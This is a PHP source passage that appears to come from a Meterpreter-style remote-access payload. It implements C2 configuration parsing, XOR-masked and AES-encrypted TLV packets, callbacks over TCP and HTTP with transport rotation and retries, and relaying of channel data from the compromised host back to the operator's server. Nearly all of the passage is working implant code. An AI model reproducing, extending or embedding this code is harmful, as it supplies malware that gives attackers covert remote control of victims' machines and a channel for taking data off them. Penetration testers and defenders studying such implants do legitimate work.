function channel_write($chan_id, $data) {
  $c = get_channel_by_id($chan_id);
  if ($c && is_resource($c[0])) {
    my_print("---Writing '$data' to channel $chan_id");
    return write($c[0], $data);
  } else {
    return false;
  }
}

# Read from the channel's stdout
function channel_read($chan_id, $len) {
  $c = &get_channel_by_id($chan_id);
  if ($c) {
    # First get any pending unread data from a previous read
    $ret = substr($c['data'], 0, $len);
    $c['data'] = substr($c['data'], $len);
    if (strlen($ret) > 0) { my_print("Had some leftovers: '$ret'"); }

    # Next grab stderr if we have it and it's not the same file descriptor
    # as stdout.
    if (strlen($ret) < $len and is_resource($c[2]) and $c[1] != $c[2]) {
      # Read as much as possible into the channel's data buffer
      $read = read($c[2]);
      $c['data'] .= $read;

      # Now slice out however much the client asked for.  If there's any
      # left over, they'll get it next time.  If it doesn't add up to
      # what they requested, oh well, they'll just have to call read
      # again. Looping until we get the requested number of bytes is
      # inconsistent with win32 meterpreter and causes the whole php
      # process to block waiting on input.
      $bytes_needed = $len - strlen($ret);
      $ret .= substr($c['data'], 0, $bytes_needed);
      $c['data'] = substr($c['data'], $bytes_needed);
    }

    # Then if there's still room, grab stdout
    if (strlen($ret) < $len and is_resource($c[1])) {
      # Same as above, but for stdout.  This will overwrite a false
      # return value from reading stderr but the two should generally
      # EOF at the same time, so it should be fine.
      $read = read($c[1]);
      $c['data'] .= $read;
      $bytes_needed = $len - strlen($ret);
      $ret .= substr($c['data'], 0, $bytes_needed);
      $c['data'] = substr($c['data'], $bytes_needed);
    }

    # In the event of one or the other of the above read()s returning
    # false, make sure we have sent any pending unread data before saying
    # EOF by returning false.  Note that if they didn't return false, it is
    # perfectly legitimate to return an empty string which just means
    # there's no data right now but we haven't hit EOF yet.
    if (false === $read and empty($ret)) {
      if (interacting($chan_id)) {
        handle_dead_resource_channel($c[1]);
      }
      return false;
    }
    return $ret;
  } else {
    return false;
  }
}

function rand_xor_byte() {
  if (can_call_function('random_int')) {
    return chr(random_int(1, 255));
  }
  return chr(mt_rand(1, 255));
}

function rand_bytes($size) {
  if (can_call_function('random_bytes')) {
    return random_bytes($size);
  }

  $b = '';
  for ($i = 0; $i < $size; $i++) {
    $b .= rand_xor_byte();
  }
  return $b;
}

function rand_xor_key() {
  return rand_bytes(4);
}

function xor_bytes($key, $data) {
  $result = '';

  for ($i = 0; $i < strlen($data); ++$i) {
    $result .= $data[$i] ^ $key[$i % 4];
  }

  return $result;
}


##
# TLV Helper Functions
##

function generate_req_id() {
  $characters = 'abcdefghijklmnopqrstuvwxyz';
  $rid = '';

  for ($p = 0; $p < 32; $p++) {
    $rid .= $characters[rand(0, strlen($characters)-1)];
  }

  return $rid;
}

function supports_aes() {
  return can_call_function('openssl_decrypt') && can_call_function('openssl_encrypt');
}

function decrypt_packet($raw) {
  $len_array = unpack("Nlen", substr($raw, 20, 4));
  $encrypt_flags = $len_array['len'];
  if ($encrypt_flags == ENC_AES256 && supports_aes() && $GLOBALS['AES_KEY'] != null) {
    $tlv = substr($raw, 24);
    $dec = openssl_decrypt(substr($tlv, 24), AES_256_CBC, $GLOBALS['AES_KEY'], OPENSSL_RAW_DATA, substr($tlv, 8, 16));
    return pack("N", strlen($dec) + 8) . substr($tlv, 4, 4) . $dec;
  }
  return substr($raw, 24);
}

function encrypt_packet($raw) {
  if (supports_aes() && $GLOBALS['AES_KEY'] != null) {
    if ($GLOBALS['AES_ENABLED'] === true) {
      $iv = rand_bytes(16);
      $enc = $iv . openssl_encrypt(substr($raw, 8), AES_256_CBC, $GLOBALS['AES_KEY'], OPENSSL_RAW_DATA, $iv);
      $hdr = pack("N", strlen($enc) + 8) . substr($raw, 4, 4);
      return $GLOBALS['SESSION_GUID'] . pack("N", ENC_AES256) . $hdr . $enc;
    }
    $GLOBALS['AES_ENABLED'] = true;
  }

  return $GLOBALS['SESSION_GUID'] . pack("N", ENC_NONE) . $raw;
}

function write_tlv_to_socket($resource, $raw) {
  $xor = rand_xor_key();
  # default to unecrypted traffic
  write($resource, $xor . xor_bytes($xor, encrypt_packet($raw)));
}

function handle_dead_resource_channel($resource) {
  global $msgsock;

  if (!is_resource($resource)) {
    return;
  }

  $cid = get_channel_id_from_resource($resource);
  if ($cid === false) {
    my_print("Resource has no channel: {$resource}");

    # Make sure the provided resource gets closed regardless of it's status
    # as a channel
    remove_reader($resource);
    close($resource);
  } else {
    my_print("Handling dead resource: {$resource}, for channel: {$cid}");

    # Make sure we close other handles associated with this channel as well
    channel_close_handles($cid);

    # Notify the client that this channel is dead
    $pkt = pack("N", PACKET_TYPE_REQUEST);
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_COMMAND_ID, COMMAND_ID_CORE_CHANNEL_CLOSE));
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, generate_req_id()));
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid));
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, $GLOBALS['UUID']));

    # Add the length to the beginning of the packet
    $pkt = pack("N", strlen($pkt) + 4) . $pkt;
    write_tlv_to_socket($msgsock, $pkt);
  }
}

function handle_resource_read_channel($resource, $data) {
  global $udp_host_map;
  $cid = get_channel_id_from_resource($resource);
  my_print("Handling data from $resource");

  # Build a new Packet
  $pkt = pack("N", PACKET_TYPE_REQUEST);
  packet_add_tlv($pkt, create_tlv(TLV_TYPE_COMMAND_ID, COMMAND_ID_CORE_CHANNEL_WRITE));
  if (array_key_exists((int)$resource, $udp_host_map)) {
    list($h,$p) = $udp_host_map[(int)$resource];
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_PEER_HOST, $h));
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_PEER_PORT, $p));
  }
  packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid));
  packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_DATA, $data));
  packet_add_tlv($pkt, create_tlv(TLV_TYPE_LENGTH, strlen($data)));
  packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, generate_req_id()));
  packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, $GLOBALS['UUID']));

  # Add the length to the beginning of the packet
  $pkt = pack("N", strlen($pkt) + 4) . $pkt;
  return $pkt;
}

function create_response($req) {
  global $id2f;
  $pkt = pack("N", PACKET_TYPE_RESPONSE);

  $command_id_tlv = packet_get_tlv($req, TLV_TYPE_COMMAND_ID);
  my_print("command id is {$command_id_tlv['value']}");
  packet_add_tlv($pkt, $command_id_tlv);

  $reqid_tlv = packet_get_tlv($req, TLV_TYPE_REQUEST_ID);
  packet_add_tlv($pkt, $reqid_tlv);

  $command_handler = $id2f[$command_id_tlv['value']];
  if (is_callable($command_handler)) {
    $result = $command_handler($req, $pkt);
  } else {
    my_print("Got a request for something I don't know how to handle (" . $command_id_tlv['value'] . " / ". $command_handler ."), returning failure");
    $result = ERROR_FAILURE;
  }

  packet_add_tlv($pkt, create_tlv(TLV_TYPE_RESULT, $result));
  packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, $GLOBALS['UUID']));

  # Add the length to the beginning of the packet
  $pkt = pack("N", strlen($pkt) + 4) . $pkt;
  return $pkt;
}

function create_tlv($type, $val) {
  return array( 'type' => $type, 'value' => $val );
}

function tlv_pack($tlv) {
  $ret = "";
  #my_print("Creating a tlv of type: {$tlv['type']}");
  if (($tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING) {
    $ret = pack("NNa*", 8 + strlen($tlv['value'])+1, $tlv['type'], $tlv['value'] . "\0");
  }
  elseif (($tlv['type'] & TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD) {
    $hi = ($tlv['value'] >> 32) & 0xFFFFFFFF;
    $lo = $tlv['value'] & 0xFFFFFFFF;
    $ret = pack("NNNN", 8 + 8, $tlv['type'], $hi, $lo);
  }
  elseif (($tlv['type'] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT) {
    $ret = pack("NNN", 8 + 4, $tlv['type'], $tlv['value']);
  }
  elseif (($tlv['type'] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL) {
    # PHP's pack appears to be busted for chars,
    $ret = pack("NN", 8 + 1, $tlv['type']);
    $ret .= $tlv['value'] ? "\x01" : "\x00";
  }
  elseif (($tlv['type'] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW) {
    $ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value'];
  }
  elseif (($tlv['type'] & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP) {
    # treat groups the same as raw
    $ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value'];
  }
  elseif (($tlv['type'] & TLV_META_TYPE_COMPLEX) == TLV_META_TYPE_COMPLEX) {
    # treat complex the same as raw
    $ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value'];
  }
  else {
    my_print("Don't know how to make a tlv of type ". $tlv['type'] .  " (meta type ". sprintf("%08x", $tlv['type'] & TLV_META_TYPE_MASK) ."), wtf");
  }
  return $ret;
}

function tlv_unpack($raw_tlv) {
  $tlv = unpack("Nlen/Ntype", substr($raw_tlv, 0, 8));
  $type = $tlv['type'];
  my_print("len: {$tlv['len']}, type: {$tlv['type']}");
  if (($type & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING) {
    $tlv = unpack("Nlen/Ntype/a*value", substr($raw_tlv, 0, $tlv['len']));
    # PHP 5.5.0 modifed the 'a' unpack format to stop removing the trailing
    # NULL, so catch that here
    $tlv['value'] = str_replace("\0", "", $tlv['value']);
  }
  elseif (($type & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT) {
    $tlv = unpack("Nlen/Ntype/Nvalue", substr($raw_tlv, 0, $tlv['len']));
  }
  elseif (($type & TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD) {
    $tlv = unpack("Nlen/Ntype/Nhi/Nlo", substr($raw_tlv, 0, $tlv['len']));
    $tlv['value'] = $tlv['hi'] << 32 | $tlv['lo'];
  }
  elseif (($type & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL) {
    $tlv = unpack("Nlen/Ntype/cvalue", substr($raw_tlv, 0, $tlv['len']));
  }
  elseif (($type & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW) {
    $tlv = unpack("Nlen/Ntype", $raw_tlv);
    $tlv['value'] = substr($raw_tlv, 8, $tlv['len']-8);
  }
  else {
    my_print("Wtf type is this? $type");
    $tlv = null;
  }
  return $tlv;
}

function packet_add_tlv(&$pkt, $tlv) {
  $pkt .= tlv_pack($tlv);
}

function packet_get_tlv($pkt, $type) {
  #my_print("Looking for a tlv of type $type");
  # Start at offset 8 to skip past the packet header
  $offset = 8;
  while ($offset < strlen($pkt)) {
    $tlv = tlv_unpack(substr($pkt, $offset));
    #my_print("len: {$tlv['len']}, type: {$tlv['type']}");
    if ($type == ($tlv['type'] & ~TLV_META_TYPE_COMPRESSED)) {
      #my_print("Found one at offset $offset");
      return $tlv;
    }
    $offset += $tlv['len'];
  }
  #my_print("Didn't find one, wtf");
  # We should return null instead of false, because false is actually
  # a valid value for a TLV and hence it's not possible to determine
  # a missing BOOL tlv value.
  return null;
}


function packet_get_tlv_raw($raw, $type) {
  $offset = 0;
  while ($offset < strlen($raw)) {
    $tlv = tlv_unpack(substr($raw, $offset));
    if ($tlv == null) { break; }
    if ($type == ($tlv['type'] & ~TLV_META_TYPE_COMPRESSED)) {
      return $tlv;
    }
    $offset += $tlv['len'];
  }
  return null;
}

function packet_enum_tlvs_raw($raw, $type) {
  $offset = 0;
  $all = array();
  while ($offset < strlen($raw)) {
    $tlv = tlv_unpack(substr($raw, $offset));
    if ($tlv == null) { break; }
    if ($type == ($tlv['type'] & ~TLV_META_TYPE_COMPRESSED)) {
      $all[] = $tlv;
    }
    $offset += $tlv['len'];
  }
  return $all;
}

function parse_c2_verb_config($group_bytes) {
  $config = array();
  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_URI);
  $config['uri'] = ($tlv != null) ? $tlv['value'] : null;
  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_ENC);
  $config['enc'] = ($tlv != null) ? $tlv['value'] : C2_ENCODING_NONE;
  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_PREFIX);
  $config['prefix'] = ($tlv != null) ? $tlv['value'] : null;
  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_SUFFIX);
  $config['suffix'] = ($tlv != null) ? $tlv['value'] : null;
  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_PREFIX_SKIP);
  $config['prefix_skip'] = ($tlv != null) ? $tlv['value'] : 0;
  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_SUFFIX_SKIP);
  $config['suffix_skip'] = ($tlv != null) ? $tlv['value'] : 0;
  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_UUID_GET);
  $config['uuid_get'] = ($tlv != null) ? $tlv['value'] : null;
  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_UUID_HEADER);
  $config['uuid_header'] = ($tlv != null) ? $tlv['value'] : null;
  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_UUID_COOKIE);
  $config['uuid_cookie'] = ($tlv != null) ? $tlv['value'] : null;
  return $config;
}

function parse_config_block($raw) {
  $config_bytes = decrypt_packet(xor_bytes(substr($raw, 0, 4), $raw));

  $config = array();

  $tlv = packet_get_tlv_raw($config_bytes, TLV_TYPE_UUID);
  $config['uuid'] = ($tlv != null) ? $tlv['value'] : str_repeat("\x00", 16);

  $tlv = packet_get_tlv_raw($config_bytes, TLV_TYPE_SESSION_GUID);
  $config['session_guid'] = ($tlv != null) ? $tlv['value'] : str_repeat("\x00", 16);

  $tlv = packet_get_tlv_raw($config_bytes, TLV_TYPE_SESSION_EXPIRY);
  $config['session_expiry'] = ($tlv != null) ? $tlv['value'] : 604800;

  $tlv = packet_get_tlv_raw($config_bytes, TLV_TYPE_DEBUG_LOG);
  $config['debug_log'] = ($tlv != null) ? $tlv['value'] : null;

  $tlv = packet_get_tlv_raw($config_bytes, TLV_TYPE_SYM_KEY);
  $config['sym_key'] = ($tlv != null) ? $tlv['value'] : null;

  $transports = array();
  foreach (packet_enum_tlvs_raw($config_bytes, TLV_TYPE_C2) as $c2_tlv) {
    $c2_bytes = $c2_tlv['value'];

    $t = array();
    $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_URL);
    if ($tlv == null) { continue; }
    $t['url'] = $tlv['value'];

    $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_COMM_TIMEOUT);
    $t['comm_timeout'] = ($tlv != null) ? $tlv['value'] : 300;
    $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_RETRY_TOTAL);
    $t['retry_total'] = ($tlv != null) ? $tlv['value'] : 3600;
    $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_RETRY_WAIT);
    $t['retry_wait'] = ($tlv != null) ? $tlv['value'] : 10;

    if (strpos($t['url'], 'http') === 0) {
      $t['type'] = 'http';
      $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_UA);
      $t['ua'] = ($tlv != null) ? $tlv['value'] : null;
      $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_PROXY_URL);
      $t['proxy_url'] = ($tlv != null) ? $tlv['value'] : null;
      $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_PROXY_USER);
      $t['proxy_user'] = ($tlv != null) ? $tlv['value'] : null;
      $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_PROXY_PASS);
      $t['proxy_pass'] = ($tlv != null) ? $tlv['value'] : null;
      $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_HEADERS);
      $t['custom_headers'] = ($tlv != null) ? $tlv['value'] : null;
      $tlv = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_UUID);
      $t['c2_uuid'] = ($tlv != null) ? $tlv['value'] : null;

      $get_group = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_GET);
      $t['c2_get'] = ($get_group != null) ? parse_c2_verb_config($get_group['value']) : null;
      $post_group = packet_get_tlv_raw($c2_bytes, TLV_TYPE_C2_POST);
      $t['c2_post'] = ($post_group != null) ? parse_c2_verb_config($post_group['value']) : null;
    } else {
      $t['type'] = 'tcp';
    }

    $transports[] = $t;
  }
  $config['transports'] = $transports;

  return $config;
}

##
# Multi-transport rotation helpers
##
define('DISPATCH_EXIT', 0);     # session ended or shutdown requested
define('DISPATCH_RETIRE', 1);   # current transport timed out / disconnected
define('DISPATCH_SWITCH', 2);   # explicit transport switch requested

function transport_next_idx($idx = null) {
  if ($idx === null) { $idx = $GLOBALS['current_transport_idx']; }
  $count = count($GLOBALS['transport_list']);
  return ($idx + 1) % $count;
}

function transport_prev_idx($idx = null) {
  if ($idx === null) { $idx = $GLOBALS['current_transport_idx']; }
  $count = count($GLOBALS['transport_list']);
  return ($idx - 1 + $count) % $count;
}

function transport_find_idx_by_url($url) {
  foreach ($GLOBALS['transport_list'] as $i => $t) {
    if ($t['url'] == $url) { return $i; }
  }
  return -1;
}

function request_transport_switch($new_idx) {
  $GLOBALS['next_transport_idx'] = $new_idx;
}

function parse_transport_from_request($req) {
  # Mirror parse_config_block per-transport parsing, but from a TLV packet
  # (with header) instead of a raw C2 group's bytes.
  $url_tlv = packet_get_tlv($req, TLV_TYPE_C2_URL);
  if ($url_tlv == null) { return null; }
  $t = array('url' => $url_tlv['value']);

  $tlv = packet_get_tlv($req, TLV_TYPE_C2_COMM_TIMEOUT);
  $t['comm_timeout'] = ($tlv != null) ? $tlv['value'] : 300;
  $tlv = packet_get_tlv($req, TLV_TYPE_C2_RETRY_TOTAL);
  $t['retry_total'] = ($tlv != null) ? $tlv['value'] : 3600;
  $tlv = packet_get_tlv($req, TLV_TYPE_C2_RETRY_WAIT);
  $t['retry_wait'] = ($tlv != null) ? $tlv['value'] : 10;

  if (strpos($t['url'], 'http') === 0) {
    $t['type'] = 'http';
    $tlv = packet_get_tlv($req, TLV_TYPE_C2_UA);
    $t['ua'] = ($tlv != null) ? $tlv['value'] : null;
    $tlv = packet_get_tlv($req, TLV_TYPE_C2_PROXY_URL);
    $t['proxy_url'] = ($tlv != null) ? $tlv['value'] : null;
    $tlv = packet_get_tlv($req, TLV_TYPE_C2_PROXY_USER);
    $t['proxy_user'] = ($tlv != null) ? $tlv['value'] : null;
    $tlv = packet_get_tlv($req, TLV_TYPE_C2_PROXY_PASS);
    $t['proxy_pass'] = ($tlv != null) ? $tlv['value'] : null;
    $tlv = packet_get_tlv($req, TLV_TYPE_C2_HEADERS);
    $t['custom_headers'] = ($tlv != null) ? $tlv['value'] : null;
    $tlv = packet_get_tlv($req, TLV_TYPE_C2_UUID);
    $t['c2_uuid'] = ($tlv != null) ? $tlv['value'] : null;

    $get_group = packet_get_tlv($req, TLV_TYPE_C2_GET);
    $t['c2_get'] = ($get_group != null) ? parse_c2_verb_config($get_group['value']) : null;
    $post_group = packet_get_tlv($req, TLV_TYPE_C2_POST);
    $t['c2_post'] = ($post_group != null) ? parse_c2_verb_config($post_group['value']) : null;
  } else {
    $t['type'] = 'tcp';
  }
  return $t;
}

function tlv_pack_transport_group($t) {
  $group  = tlv_pack(create_tlv(TLV_TYPE_C2_URL, $t['url']));
  $group .= tlv_pack(create_tlv(TLV_TYPE_C2_COMM_TIMEOUT, $t['comm_timeout']));
  $group .= tlv_pack(create_tlv(TLV_TYPE_C2_RETRY_TOTAL, $t['retry_total']));
  $group .= tlv_pack(create_tlv(TLV_TYPE_C2_RETRY_WAIT, $t['retry_wait']));
  if ($t['type'] == 'http') {
    if (!empty($t['ua'])) {
      $group .= tlv_pack(create_tlv(TLV_TYPE_C2_UA, $t['ua']));
    }
    if (!empty($t['proxy_url'])) {
      $group .= tlv_pack(create_tlv(TLV_TYPE_C2_PROXY_URL, $t['proxy_url']));
    }
    if (!empty($t['c2_uuid'])) {
      $group .= tlv_pack(create_tlv(TLV_TYPE_C2_UUID, $t['c2_uuid']));
    }
  }
  return $group;
}

function activate_transport(&$transport) {
  if ($transport['type'] == 'http') {
    return true;
  }
  # TCP: use the pre-connected stager socket on the first attempt of the first
  # transport. Subsequent TCP transports must open a fresh socket.
  if (isset($GLOBALS['msgsock']) && empty($GLOBALS['_msgsock_consumed'])) {
    $msgsock = $GLOBALS['msgsock'];
    $msgsock_type = $GLOBALS['msgsock_type'];
    switch ($msgsock_type) {
      case 'socket':
        register_socket($msgsock);
        break;
      case 'stream':
      default:
        register_stream($msgsock);
    }
    $transport['_socket'] = $msgsock;
    $GLOBALS['_msgsock_consumed'] = true;
    return true;
  }
  $url_parts = parse_url($transport['url']);
  if (!isset($url_parts['host']) || !isset($url_parts['port'])) {
    my_print("Invalid TCP transport URL: " . $transport['url']);
    return false;
  }
  my_print("TCP transport, connecting to " . $url_parts['host'] . ":" . $url_parts['port']);
  $sock = connect($url_parts['host'], $url_parts['port']);
  if (!$sock) { return false; }
  $transport['_socket'] = $sock;
  return true;
}

function activate_transport_with_retry(&$transport) {
  $end = time() + $transport['retry_total'];
  $first = true;
  while (time() < $end) {
    if (!$first) {
      $wait = max(1, (int)$transport['retry_wait']);
      sleep($wait);
    }
    if (activate_transport($transport)) {
      return true;
    }
    $first = false;
  }
  return false;
}

function dispatch_tcp(&$transport) {
  $msgsock = $transport['_socket'];
  add_reader($msgsock);
  $r = $GLOBALS['readers'];
  $w = null; $e = null; $t = 1;
  while (false !== ($cnt = select($r, $w, $e, $t))) {
    if (empty($GLOBALS['running']) || time() > $GLOBALS['session_expiry_end']) {
      remove_reader($msgsock); close($msgsock);
      return DISPATCH_EXIT;
    }
    if ($GLOBALS['next_transport_idx'] !== null) {
      remove_reader($msgsock); close($msgsock);
      return DISPATCH_SWITCH;
    }
    for ($i = 0; $i < $cnt; $i++) {
      $ready = $r[$i];
      if ($ready == $msgsock) {
        $packet = read($msgsock, 32);
        if (false == $packet) {
          remove_reader($msgsock); close($msgsock);
          return DISPATCH_RETIRE;
        }
        $xor = substr($packet, 0, 4);
        $header = xor_bytes($xor, substr($packet, 4, 28));
        $len_array = unpack("Nlen", substr($header, 20, 4));
        $len = $len_array['len'] + 32 - 8;
        while (strlen($packet) < $len) {
          $packet .= read($msgsock, $len - strlen($packet));
        }
        $response = create_response(decrypt_packet(xor_bytes($xor, $packet)));
        write_tlv_to_socket($msgsock, $response);
      } else {
        $data = read($ready);
        if (false === $data) {
          handle_dead_resource_channel($ready);
        } elseif (strlen($data) > 0) {
          $request = handle_resource_read_channel($ready, $data);
          if ($request) {
            write_tlv_to_socket($msgsock, $request);
          }
        }
      }
    }
    $r = $GLOBALS['readers'];
  }
  remove_reader($msgsock); close($msgsock);
  return DISPATCH_RETIRE;
}

function dispatch_http(&$transport) {
  my_print("Starting HTTP transport to " . $transport['url']);
  $last_packet_time = time();
  $empty_count = 0;

  while (true) {
    if (empty($GLOBALS['running']) || time() >= $GLOBALS['session_expiry_end']) {
      return DISPATCH_EXIT;
    }
    if ($GLOBALS['next_transport_idx'] !== null) {
      return DISPATCH_SWITCH;
    }
    if (time() > $last_packet_time + $transport['comm_timeout']) {
      my_print("Communication timeout reached");
      return DISPATCH_RETIRE;
    }

    $raw = http_get_packet($transport);

    if ($raw != null && strlen($raw) >= 32) {
      $empty_count = 0;
      $last_packet_time = time();

      $xor = substr($raw, 0, 4);
      $decrypted = decrypt_packet(xor_bytes($xor, $raw));
      $response = create_response($decrypted);

      $xor_key = rand_xor_key();
      $encrypted = encrypt_packet($response);
      $packet = $xor_key . xor_bytes($xor_key, $encrypted);
      http_send_packet($transport, $packet);
    } else {
      if ($raw !== null) {
        # empty 200: connection is alive
        $last_packet_time = time();
      }
      $delay = min(10, $empty_count * 0.1);
      $empty_count++;
      usleep((int)($delay * 1000000));
    }
  }
}

function packet_get_all_tlvs($pkt, $type) {
  my_print("Looking for all tlvs of type $type");
  # Start at offset 8 to skip past the packet header
  $offset = 8;
  $all = array();
  while ($offset < strlen($pkt)) {
    $tlv = tlv_unpack(substr($pkt, $offset));
    if ($tlv == NULL) {
      break;
    }
    my_print("len: {$tlv['len']}, type: {$tlv['type']}");
    if (empty($type) || $type == ($tlv['type'] & ~TLV_META_TYPE_COMPRESSED)) {
      my_print("Found one at offset $offset");
      array_push($all, $tlv);
    }
    $offset += $tlv['len'];
  }
  return $all;
}


##
# Functions for genericizing the stream/socket conundrum
##


function register_socket($sock, $ipaddr=null, $port=null) {
  global $resource_type_map, $udp_host_map;
  my_print("Registering socket $sock for ($ipaddr:$port)");
  $resource_type_map[(int)$sock] = 'socket';
  if ($ipaddr) {
    $udp_host_map[(int)$sock] = array($ipaddr, $port);
    #dump_array($udp_host_map, "UDP Map after registering a new socket");
  }
}

# The stream functions cannot be unconnected, so don't require a host map
function register_stream($stream, $ipaddr=null, $port=null) {
  global $resource_type_map, $udp_host_map;
  my_print("Registering stream $stream for ($ipaddr:$port)");
  $resource_type_map[(int)$stream] = 'stream';
  if ($ipaddr) {
    $udp_host_map[(int)$stream] = array($ipaddr, $port);
    #dump_array($udp_host_map, "UDP Map after registering a new stream");
  }
}

function connect($ipaddr, $port, $proto='tcp') {
  my_print("Doing connect($ipaddr, $port)");
  $sock = false;

  # IPv6 requires brackets around the address in some cases, but not all.
  # Keep track of the un-bracketed address for the functions that don't like
  # brackets, specifically socket_connect and socket_sendto.
  $ipf = WIN_AF_INET;
  $raw_ip = $ipaddr;
  if (FALSE !== strpos($ipaddr, ":")) {
    $ipf = WIN_AF_INET6;
    $ipaddr = "[". $raw_ip ."]";
  }

  # Prefer the stream versions so we don't have to use both select functions
  # unnecessarily, but fall back to socket_create if they aren't available.
  if (can_call_function('stream_socket_client')) {
    my_print("stream_socket_client({$proto}://{$ipaddr}:{$port})");
    if ($proto == 'ssl') {
      $sock = stream_socket_client("ssl://{$ipaddr}:{$port}",
        $errno, $errstr, 5, STREAM_CLIENT_ASYNC_CONNECT);
      if (!$sock) { return false; }
      stream_set_blocking($sock, 0);
      register_stream($sock);
    } elseif ($proto == 'tcp') {
      $sock = stream_socket_client("tcp://{$ipaddr}:{$port}");
      if (!$sock) { return false; }
      register_stream($sock);
    } elseif ($proto == 'udp') {
      $sock = stream_socket_client("udp://{$ipaddr}:{$port}");
      if (!$sock) { return false; }
      register_stream($sock, $ipaddr, $port);
    }
  } else
    if (can_call_function('fsockopen')) {
      my_print("fsockopen");
      if ($proto == 'ssl') {
        $sock = fsockopen("ssl://{$ipaddr}:{$port}");
        stream_set_blocking($sock, 0);
        register_stream($sock);
      } elseif ($proto == 'tcp') {
        $sock = fsockopen($ipaddr, $port);
        if (!$sock) { return false; }
        if (can_call_function('socket_set_timeout')) {
          socket_set_timeout($sock, 2);
        }
        register_stream($sock);
      } else {
        $sock = fsockopen($proto."://".$ipaddr,$port);
        if (!$sock) { return false; }
        register_stream($sock, $ipaddr, $port);
      }
    } else
      if (can_call_function('socket_create')) {
        my_print("socket_create");
        if ($proto == 'tcp') {
          $sock = socket_create($ipf, SOCK_STREAM, SOL_TCP);
          $res = socket_connect($sock, $raw_ip, $port);
          if (!$res) { return false; }
          register_socket($sock);
        } elseif ($proto == 'udp') {
          $sock = socket_create($ipf, SOCK_DGRAM, SOL_UDP);
          register_socket($sock, $raw_ip, $port);
        }
      }

  return $sock;
}

function eof($resource) {
  $ret = false;
  switch (get_rtype($resource)) {
    # XXX Doesn't work with sockets.
  case 'socket': break;
  case 'stream':
    # We set the socket timeout for streams opened with fsockopen() when
    # they are created. I hope this is enough to deal with hangs when
    # calling feof() on socket streams, but who knows. This is PHP,
    # anything could happen. Some day they'll probably add a new function
    # called stream_eof() and it will handle sockets properly except for
    # some edge case that happens for every socket except the one or two
    # they tested it on and it will always return false on windows and
    # later they'll rename it to real_stream_eof_this_language_isretarded().
    #
    # See http://us2.php.net/manual/en/function.feof.php , specifically this:
    #   If a connection opened by fsockopen() wasn't closed by the server,
    #   feof() will hang. To workaround this, see below example:
    #     <?php
    #     function safe_feof($fp, &$start = NULL) {
    #     ...
    $ret = feof($resource);
    break;
  }
  return $ret;
}

function close($resource) {
  my_print("Closing resource $resource");
  global $resource_type_map, $udp_host_map;

  remove_reader($resource);
  switch (get_rtype($resource)) {
  case 'socket': $ret = socket_close($resource); break;
  case 'stream': $ret = fclose($resource); break;
  }
  # Every resource should be in the resource type map, but check anyway
  if (array_key_exists((int)$resource, $resource_type_map)) {
    unset($resource_type_map[(int)$resource]);
  }
  if (array_key_exists((int)$resource, $udp_host_map)) {
    my_print("Removing $resource from udp_host_map");
    unset($udp_host_map[(int)$resource]);
  }
  return $ret;
}

function read($resource, $len=null) {
  global $udp_host_map;
  # Max packet length is magic.  If we're reading a pipe that has data but
  # isn't going to generate any more without some input, then reading less
  # than all bytes in the buffer or 8192 bytes, the next read will never
  # return.
  if (is_null($len)) { $len = 8192; }
  #my_print(sprintf("Reading from $resource which is a %s", get_rtype($resource)));
  $buff = '';
  switch (get_rtype($resource)) {
  case 'socket':
    if (array_key_exists((int)$resource, $udp_host_map)) {
      my_print("Reading UDP socket");
      list($host,$port) = $udp_host_map[(int)$resource];
      socket_recvfrom($resource, $buff, $len, PHP_BINARY_READ, $host, $port);
    } else {
      my_print("Reading TCP socket");
      $buff .= socket_read($resource, $len, PHP_BINARY_READ);
    }
    break;
  case 'stream':
    global $msgsock;
    # Calling select here should ensure that we never try to read from a socket
    # or pipe that doesn't currently have data.  If that ever happens, the
    # whole php process will block waiting for data that may never come.
